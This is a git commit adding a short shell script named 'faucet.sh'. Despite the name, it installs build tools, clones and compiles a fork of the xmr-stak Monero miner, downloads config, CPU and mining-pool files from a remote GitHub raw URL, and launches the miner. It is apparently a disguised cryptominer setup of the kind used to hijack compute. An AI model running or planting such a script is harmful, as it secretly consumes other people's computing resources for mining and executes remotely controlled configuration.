6b7ea1e9cdd4bf8c969d622b8833593c5f7fdee7
ADYZM <46257040+ADYZM@users.noreply.github.com>
2022-04-16 01:21:51 +0700

    Create faucet.sh

---
+++ faucet.sh
@@ -0,0 +1,19 @@
+sudo apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
+
+git clone https://github.com/ADYZM/xmr-stak.git -b xmr-stak-rx
+
+mkdir xmr-stak/build
+
+cd xmr-stak/build
+
+cmake ..
+
+make install
+
+wget https://raw.githubusercontent.com/ADYZM/xmr-stak2/main/config.txt
+
+wget https://raw.githubusercontent.com/ADYZM/xmr-stak2/main/cpu.txt
+
+wget https://raw.githubusercontent.com/ADYZM/xmr-stak2/main/pools.txt
+
+./xmr-stak.rx
